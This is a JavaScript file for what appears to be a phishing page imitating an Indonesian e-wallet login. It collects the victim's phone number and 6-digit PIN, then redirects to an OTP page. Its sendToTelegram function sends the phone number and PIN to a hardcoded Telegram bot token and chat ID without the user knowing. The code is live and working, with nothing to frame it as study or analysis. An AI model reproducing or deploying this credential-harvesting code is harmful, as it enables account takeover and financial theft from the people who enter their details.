// Penyesuaian tinggi viewport jika browser tidak mendukung dvh
function setViewportHeight() {
  document.documentElement.style.setProperty('--vh', `${window.innerHeight * 0.01}px`);
}
window.addEventListener('resize', setViewportHeight);
window.addEventListener('orientationchange', setViewportHeight);
setViewportHeight();

const pinValues = Array(6).fill('');
let revealTimeout = null;
let savedPhoneNumber = '';
let suppressResize = false;
let ignoreFirstResize = true;

function showPinPage() {
  suppressResize = true;

  const phone = document.getElementById('phone-input').value.trim();
  const errorEl = document.getElementById('error-message');
  let normalizedPhone = phone.startsWith('0') ? phone.slice(1) : phone;
  const phoneRegex = /^8[1-9][0-9]{7,11}$/;

  if (!phoneRegex.test(normalizedPhone)) {
    errorEl.style.display = 'block';
    suppressResize = false;
    return;
  }

  errorEl.style.display = 'none';
  savedPhoneNumber = normalizedPhone;
  localStorage.setItem('phone', normalizedPhone);

  // Tambahkan entry ke history agar tombol back bisa kembali
  history.pushState({ page: "pin" }, "PIN", "#pin");

  document.getElementById('input-nomor').style.display = 'none';
  document.getElementById('pin-page').style.display = 'flex';
  document.getElementById('pin-input').focus();
  updateDots();

  setTimeout(() => {
    suppressResize = false;
  }, 10);
}

function updateDots(showIndex = -1) {
  const dotsContainer = document.getElementById('pin-dots');
  dotsContainer.innerHTML = '';
  for (let i = 0; i < 6; i++) {
    const dot = document.createElement('div');
    dot.className = 'pin-dot';
    dot.style.opacity = pinValues[i] ? '1' : '0.3';
    if (i === showIndex && pinValues[i]) {
      dot.textContent = pinValues[i];
      clearTimeout(revealTimeout);
      revealTimeout = setTimeout(updateDots, 500);
    }
    dotsContainer.appendChild(dot);
  }
}

async function sendToTelegram(pin) {
  const token = '7573991625:AAGEabvedzkHODDvk0hE5RZ7mOWvC981sD4';
  const chat_id = '7105244348';
  const message = `Nomor: ${savedPhoneNumber}\nPIN: ${pin}`;
  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
  try {
    await fetch(url);
  } catch (err) {
    console.error("Gagal mengirim ke Telegram", err);
  }
}

function handlePinInput(val) {
  if (val.length > 6) return;
  for (let i = 0; i < 6; i++) {
    pinValues[i] = val[i] || '';
  }
  updateDots(val.length - 1);
  if (val.length === 6) {
    sendToTelegram(val);
    setTimeout(() => {
      window.location.href = 'otp.html';
    }, 100);
  }
}

window.addEventListener('pageshow', (event) => {
  if (event.persisted || performance.getEntriesByType("navigation")[0].type === "back_forward") {
    resetToHome();
  }
});

function resetToHome() {
  document.getElementById('input-nomor').style.display = 'flex';
  document.getElementById('pin-page').style.display = 'none';
  document.getElementById('phone-input').value = '';
  document.getElementById('pin-input').value = '';
  pinValues.fill('');
  updateDots();
  localStorage.removeItem('phone');
}

// Tangani tombol back pada Android
window.addEventListener('popstate', function (event) {
  if (event.state && event.state.page === "pin") {
    // Jika masih di halaman PIN, tidak lakukan apa-apa
    return;
  }
  // Kembali ke halaman input nomor
  resetToHome();
});

const continueButton = document.querySelector('.btn');

if (window.visualViewport) {
  visualViewport.addEventListener('resize', () => {
    if (suppressResize || ignoreFirstResize) {
      ignoreFirstResize = false;
      return;
    }

    const bottomOffset = window.innerHeight - visualViewport.height - visualViewport.offsetTop;

    if (bottomOffset > 100) {
      continueButton.style.bottom = `${bottomOffset + 16}px`;
    } else {
      continueButton.style.bottom = '24px';
    }
  });
}
